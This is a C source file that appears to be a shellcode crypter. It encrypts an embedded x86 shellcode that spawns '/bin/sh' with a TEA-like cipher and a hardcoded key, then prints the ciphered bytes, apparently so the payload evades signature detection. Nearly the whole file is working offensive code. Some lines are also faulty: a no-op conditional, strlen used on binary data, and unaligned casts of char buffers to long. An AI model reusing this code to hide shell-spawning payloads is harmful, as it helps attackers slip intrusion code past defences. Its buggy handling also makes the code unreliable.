#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void encode(long *data, long *key) {
	unsigned long y = data[0], z = data[1],
	sum = 0, delta = 0x9e3779b9, n = 32;
	while (n-- > 0) {
		sum += delta;
		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
	}
	data[0] = y;
	data[1] = z;
}

void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void codestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		encode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char shellcode[] = \
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //execve-stack
	
	char key[16] = "iloveshellcodess";
	
	codestr(shellcode, key);

	printf("Ciphered shellcode size: %d\n", strlen(shellcode));
	printf("Ciphered shellcode:\n");

	for (int i=0;i<strlen(shellcode);i++)
	{
		printf("\\x%02x", (unsigned char)(int)shellcode[i]);
	}
	
	return 0;
}